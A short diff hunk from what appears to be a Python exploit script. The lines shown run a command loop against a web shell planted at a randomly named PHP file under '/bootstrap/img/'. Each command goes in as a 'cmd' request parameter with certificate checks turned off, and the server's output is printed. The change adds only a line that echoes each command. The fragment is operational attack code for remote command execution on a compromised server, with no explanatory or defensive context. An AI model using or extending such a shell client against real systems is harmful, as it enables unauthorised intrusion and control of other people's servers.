@@ -31,6 +31,7 @@ if random_file in r.text:
             if cmd == 'exit':
                 sys.exit(0)
             r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
+            print(cmd)
             print(r.text)
 else:
     if r.status_code == 200:
